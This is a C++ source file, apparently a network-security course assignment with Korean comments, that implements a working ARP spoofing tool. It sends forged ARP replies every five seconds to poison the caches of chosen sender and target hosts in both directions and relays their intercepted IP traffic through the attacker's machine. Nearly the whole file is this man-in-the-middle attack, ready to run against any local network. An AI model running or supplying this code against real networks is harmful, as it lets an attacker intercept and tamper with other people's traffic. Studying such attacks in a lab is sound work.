#include <cstdlib>
#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include <string>
#include <iostream>
#include <vector>
#include <map>
#include <ifaddrs.h>
#include <cctype>
#include <array>
#include <memory>
#include <sstream>
#include <unistd.h>
#include <algorithm>
#include <thread>
#include <atomic>
#include <cstring>
#include <netinet/ether.h>
#include <netinet/ip.h>
#include <utility>
#include <chrono>
#include <mutex>

using namespace std;
#include <arpa/inet.h> // for inet_ntoa and ntohl

// Function to convert IP to string
std::string ipToString(uint32_t ip) {
    struct in_addr ip_addr;
    ip_addr.s_addr = ntohl(ip); // Convert from network byte order to host byte order
    return std::string(inet_ntoa(ip_addr));
}

#pragma pack(push, 1)

// 전역 변수 선언
std::map<std::string, std::string> ipPairMap;    // senderIP:targetIP 쌍을 저장
std::map<std::string, std::string> ipMacMap;     // IP:MAC 정보를 저장

struct EthArpPacket final {
    EthHdr eth_;
    ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
    printf("syntax : send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
    printf("sample : send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

string execCommand(const string& cmd) {
    array<char, 128> buffer;
    string result;
    shared_ptr<FILE> pipe(popen(cmd.c_str(), "r"), pclose);
    if (!pipe) {
        throw runtime_error("popen() failed!");
    }
    while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
        result += buffer.data();
    }
    return result;
}

class MyNet {
private:
    string dev;
    string myNetStatus;
    string myRoute;
    string myIP;
    string myIPBroad;
    string myMac;
    string gateway;

public:
    MyNet(string device) {
        this->dev = device;
        this->myNetStatus = execCommand("ip address show " + device);
        int _tIndex1 = myNetStatus.find("inet") + 5;
        int _tIndex2 = myNetStatus.find("/", _tIndex1);
        if (_tIndex1 == string::npos || _tIndex2 == string::npos) {
            throw runtime_error("Failed to parse IP address.");
        }
        this->myIP = myNetStatus.substr(_tIndex1, _tIndex2 - _tIndex1);
        
        int _tIndex3 = myNetStatus.find("brd", _tIndex2) + 4;
        int _tIndex4 = myNetStatus.find("scope", _tIndex3);
        if (_tIndex3 == string::npos || _tIndex4 == string::npos) {
            throw runtime_error("Failed to parse broadcast address.");
        }
        this->myIPBroad = myNetStatus.substr(_tIndex3, _tIndex4 - _tIndex3 - 1);
        this->myMac = myNetStatus.substr(myNetStatus.find("link/ether") + 11, 17);
        this->myRoute = execCommand("route -nn | grep " + device + " | grep G");
        istringstream iss(myRoute);
        string _;
        iss >> _ >> this->gateway;
        if (this->gateway.empty()) {
            throw runtime_error("Failed to parse gateway.");
        }
    }

    char* getDev() {
        return &dev[0];
    }

    string getMyMac() {
        return this->myMac;
    }

    string getMyIP() {
        return this->myIP;
    }

    string getMyIPBroad() {
        return this->myIPBroad;
    }

    string getGateway() {
        return this->gateway;
    }
};
std::string macToString(const u_char* mac) {
    char macStr[18];
    std::sprintf(macStr, "%02x:%02x:%02x:%02x:%02x:%02x",
        mac[0], mac[1], mac[2],
        mac[3], mac[4], mac[5]);
    return std::string(macStr);
}
class ArpResource {
public:
    string eth_smac;
    string eth_dmac;
    string arp_smac;
    string arp_tmac;
    string arp_sip;
    string arp_tip;

    ArpResource(string eth_smac, string eth_dmac, string arp_smac, string arp_tmac, string arp_sip, string arp_tip)
        : eth_smac(eth_smac), eth_dmac(eth_dmac), arp_smac(arp_smac), arp_tmac(arp_tmac), arp_sip(arp_sip), arp_tip(arp_tip) {}
};

int arpSend(char* dev, int type, ArpResource arpST) {
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "Couldn't open device %s(%s)\n", dev, errbuf);
        return -1;
    }

    EthArpPacket packet;
    packet.eth_.dmac_ = Mac(arpST.eth_dmac);
    packet.eth_.smac_ = Mac(arpST.eth_smac);
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;

    packet.arp_.op_ = htons((type == 0) ? ArpHdr::Request : ArpHdr::Reply);
    packet.arp_.smac_ = Mac(arpST.arp_smac);
    packet.arp_.sip_ = htonl(Ip(arpST.arp_sip));
    packet.arp_.tmac_ = Mac(arpST.arp_tmac);
    packet.arp_.tip_ = htonl(Ip(arpST.arp_tip));

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }

    pcap_close(handle);
    return res;
}


bool checkIP(const string& ip) {
    vector<string> parts;
    istringstream iss(ip);
    string part;
    while (getline(iss, part, '.')) {
        parts.push_back(part);
    }
    if (parts.size() != 4) return false;
    for (const string& p : parts) {
        if (p.empty() || p.size() > 3 || !all_of(p.begin(), p.end(), ::isdigit)) {
            return false;
        }
        int num = stoi(p);
        if (num < 0 || num > 255) return false;
    }
    return true;
}
std::string getMacOnARPReply(char* dev, const std::string& targetIP, const std::string& myMac) {
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (handle == nullptr) {
        throw std::runtime_error("Couldn't open device " + std::string(dev) + ": " + std::string(errbuf));
    }

    struct bpf_program fp;
    std::string filter_exp = "arp and arp[7] = 2"; // Only capture ARP replies
    if (pcap_compile(handle, &fp, filter_exp.c_str(), 0, PCAP_NETMASK_UNKNOWN) == -1) {
        pcap_close(handle);
        throw std::runtime_error("Couldn't parse filter " + filter_exp + ": " + std::string(pcap_geterr(handle)));
    }

    if (pcap_setfilter(handle, &fp) == -1) {
        pcap_close(handle);
        throw std::runtime_error("Couldn't install filter " + filter_exp + ": " + std::string(pcap_geterr(handle)));
    }

    auto start_time = std::chrono::steady_clock::now();

    while (true) {
        struct pcap_pkthdr* header;
        const u_char* packet;
        int res = pcap_next_ex(handle, &header, &packet);
        
        if (res == 0) continue; // Timeout, continue waiting
        if (res == -1 || res == -2) break; // Error or termination, exit loop

        EthArpPacket* recvPacket = (EthArpPacket*)packet;

        // Check if it's an ARP reply and matches our request
        if (ntohs(recvPacket->eth_.type_) == EthHdr::Arp &&
            ntohs(recvPacket->arp_.op_) == ArpHdr::Reply &&
            recvPacket->eth_.dmac_ == Mac(myMac) &&
            uint32_t(recvPacket->arp_.sip_) == htonl(uint32_t(Ip(targetIP))) &&
            std::string(recvPacket->arp_.smac_) != "00:00:00:00:00:00" &&
            uint32_t(recvPacket->arp_.sip_) != 0x00000000) {
            // Process valid ARP reply

 
            // Print the correct IP and MAC addresses
            std::cout << "Captured ARP Reply from IP: " << ipToString(recvPacket->arp_.sip_)
                      << " with MAC: " << std::string(recvPacket->arp_.smac_) << std::endl;

            pcap_close(handle);
            return std::string(recvPacket->arp_.smac_);
        }

        // Timeout after a certain duration (e.g., 5 seconds)
        auto elapsed_time = std::chrono::steady_clock::now() - start_time;
        if (std::chrono::duration_cast<std::chrono::seconds>(elapsed_time).count() > 5) {
            break;
        }
    }

    pcap_close(handle);
    throw std::runtime_error("No ARP reply received for the specified IP address");
}

string getMacOfIP(MyNet& myNet, const string& ip) {
    // Send ARP request
    if (ip == myNet.getMyIP()) return myNet.getMyMac();
    arpSend(myNet.getDev(), 0, ArpResource(
        myNet.getMyMac(),
        "FF:FF:FF:FF:FF:FF", 
        myNet.getMyMac(),
        "00:00:00:00:00:00",
        myNet.getMyIP(),
        ip
    ));
    //sleep for 1 second
    sleep(1);
    string command = "arp -ann |grep '("+ip+")'| awk '{print $4}'";
    cout << command << endl;
    return(execCommand(command));
    // Wait and capture the corresponding ARP reply
    // return getMacOnARPReply(myNet.getDev(), ip, myNet.getMyMac());
}


bool arpAttack(MyNet& myNet, const string& senderIP, const string& targetIP) {
    string senderMac = ipMacMap[senderIP];
    return arpSend(myNet.getDev(), 1, ArpResource(
        myNet.getMyMac(),
        senderMac, 
        myNet.getMyMac(),
        senderMac,
        targetIP,
        senderIP
    )) == 0;
}



// void packetForwarding(const std::string& dev, const std::string& senderMac, const std::string& targetMac, const std::string& myMac, std::atomic<bool>& stopFlag) {
//     char errbuf[PCAP_ERRBUF_SIZE];
//     pcap_t* handle = pcap_open_live(dev.c_str(), BUFSIZ, 1, 1000, errbuf);
//     if (handle == nullptr) {
//         std::cerr << "Couldn't open device " << dev << " (" << errbuf << ")" << std::endl;
//         return;
//     }

//     std::cout << "Listening on device: " << dev << std::endl;

//     while (!stopFlag) {
//         struct pcap_pkthdr* header;
//         const u_char* packet;
//         int res = pcap_next_ex(handle, &header, &packet);
//         if (res == 0) continue; // Timeout, wait for next packet
//         if (res == -1 || res == -2) break; // Error or termination

//         struct ethhdr* eth = (struct ethhdr*)packet;

//         // Filter only IP packets (Ethertype 0x0800)
//         if (ntohs(eth->h_proto) != 0x0800) {
//             continue;
//         }

//         std::string srcMac = macToString(eth->h_source);
//         std::string destMac = macToString(eth->h_dest);

//         // Handle packets from sender to target
//         if (srcMac == senderMac && destMac == myMac) {
//             std::memcpy(eth->h_source, ether_aton(myMac.c_str()), 6);  // Set source MAC to my MAC
//             std::memcpy(eth->h_dest, ether_aton(targetMac.c_str()), 6); // Set destination MAC to target MAC
//         }
//         // Handle packets from target to sender
//         else if (srcMac == targetMac && destMac == myMac) {
//             std::memcpy(eth->h_source, ether_aton(myMac.c_str()), 6);  // Set source MAC to my MAC
//             std::memcpy(eth->h_dest, ether_aton(senderMac.c_str()), 6); // Set destination MAC to sender MAC
//         } else {
//             // Skip packets not between sender and target
//             continue;
//         }

//         // Forward the packet to its intended destination
//         if (pcap_sendpacket(handle, packet, header->caplen) != 0) {
//             std::cerr << "Failed to forward packet: " << pcap_geterr(handle) << std::endl;
//         }
//     }

//     pcap_close(handle);
// }

void packetForwarding(const std::string& dev, const std::string& senderMac, const std::string& targetMac, const std::string& myMac, std::atomic<bool>& stopFlag) {
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev.c_str(), BUFSIZ, 1, 1000, errbuf);
    if (handle == nullptr) {
        std::cerr << "Couldn't open device " << dev << " (" << errbuf << ")" << std::endl;
        return;
    }

    std::cout << "Listening on device: " << dev << std::endl;

    while (!stopFlag) {
        struct pcap_pkthdr* header;
        const u_char* packet;
        int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0) continue; // Timeout, wait for next packet
        if (res == -1 || res == -2) break; // Error or termination

        struct ethhdr* eth = (struct ethhdr*)packet;

        // Check if the packet is an IP packet (0x0800)
        if (ntohs(eth->h_proto) != 0x0800) {
            continue;
        }

        std::string srcMac = macToString(eth->h_source);
        std::string destMac = macToString(eth->h_dest);

        // Print captured packet info
        std::cout << "Captured packet - Src MAC: " << srcMac << ", Dest MAC: " << destMac << std::endl;

        // Check if the packet is from the sender we want to spoof
        if (destMac == myMac) {
            // Modify the source MAC to our MAC address
            std::memcpy(eth->h_source, ether_aton(myMac.c_str()), 6);
            // Modify the destination MAC to the target MAC address
            std::memcpy(eth->h_dest, ether_aton(targetMac.c_str()), 6);

            // Print modified packet info
            std::cout << "Modified packet - New Src MAC: " << myMac << ", New Dest MAC: " << targetMac << std::endl;

            // Forward the packet to its intended destination
            if (pcap_sendpacket(handle, packet, header->caplen) != 0) {
                std::cerr << "Failed to forward packet: " << pcap_geterr(handle) << std::endl;
            } else {
                std::cout << "Packet forwarded successfully" << std::endl;
            }
        }
    }

    pcap_close(handle);
}



void printMaps() {
    // Print the senderIP:targetIP pairs
    std::cout << "IP Pairs (senderIP:targetIP):" << std::endl;
    for (const auto& pair : ipPairMap) {
        std::cout << "\tSender IP: " << pair.first << " -> Target IP: " << pair.second << std::endl;
    }

    std::cout << std::endl;

    // Print the IP:MAC mappings
    std::cout << "IP to MAC Mappings:" << std::endl;
    for (const auto& mapping : ipMacMap) {
        std::cout << "\tIP: " << mapping.first << " -> MAC: " << mapping.second << std::endl;
    }
}

void arpSpoofBoth(MyNet& myNet, const std::string& senderIP, const std::string& targetIP, std::atomic<bool>& stopFlag) {
    while (!stopFlag) {
        // sender -> target ARP 스푸핑
        // printMaps();
        if (!arpAttack(myNet, senderIP, targetIP)) {
            std::cerr << "Failed to send ARP Spoofing packet from " << senderIP << " to " << targetIP << std::endl;
        }

        // target -> sender ARP 스푸핑
        if (!arpAttack(myNet, targetIP, senderIP)) {
            std::cerr << "Failed to send ARP Spoofing packet from " << targetIP << " to " << senderIP << std::endl;
        }

        std::cout << "ARP Spoofing packets sent to both sender and target" << std::endl;

        std::this_thread::sleep_for(std::chrono::seconds(5)); // 5초마다 패킷 전송
    }
}



int main(int argc, char* argv[]) {
    if (argc < 4 || argc % 2 != 0) {
        usage();
        return -1;
    }

    vector<std::string> argument;
    for (int i = 2; i < argc; ++i) {
        argument.push_back(argv[i]);
    }

    try {
        MyNet myNet(argv[1]);
        std::atomic<bool> stopFlag(false);

        std::vector<std::thread> threads;

        for (size_t i = 0; i < argument.size(); i += 2) {
            if (!checkIP(argument[i]) || !checkIP(argument[i + 1])) {
                usage();
                return -1;
            }

            // senderIP:targetIP 쌍을 저장
            ipPairMap[argument[i]] = argument[i + 1];

            // sender와 target의 MAC 주소를 저장
            std::string senderMac = getMacOfIP(myNet, argument[i]);
            std::string targetMac = getMacOfIP(myNet, argument[i + 1]);
            ipMacMap[argument[i]] = senderMac;
            ipMacMap[argument[i + 1]] = targetMac;

            // 양방향 ARP 스푸핑 스레드 생성
            threads.emplace_back(arpSpoofBoth, std::ref(myNet), argument[i], argument[i + 1], std::ref(stopFlag));
        }

        // 모든 IP 쌍에 대해 패킷 포워딩 스레드 생성
        for (const auto& ipPair : ipPairMap) {
            std::string senderIP = ipPair.first;
            std::string targetIP = ipPair.second;

            std::string senderMac = ipMacMap[senderIP];
            std::string targetMac = ipMacMap[targetIP];

            // 패킷 포워딩 스레드 생성 및 로그 출력
            threads.emplace_back(packetForwarding, myNet.getDev(), senderMac, targetMac, myNet.getMyMac(), std::ref(stopFlag));
            threads.emplace_back(packetForwarding, myNet.getDev(), targetMac, senderMac, myNet.getMyMac(), std::ref(stopFlag));
        }

        // Enter 키를 누를 때까지 대기
        std::cout << "Press Enter to stop..." << std::endl;
        std::cin.get();
        stopFlag = true;

        // 모든 스레드가 종료될 때까지 대기
        for (auto& th : threads) {
            if (th.joinable()) {
                th.join();
            }
        }

    } catch (const std::exception& e) {
        std::cerr << e.what() << std::endl;
        return -1;
    }

    return 0;
}
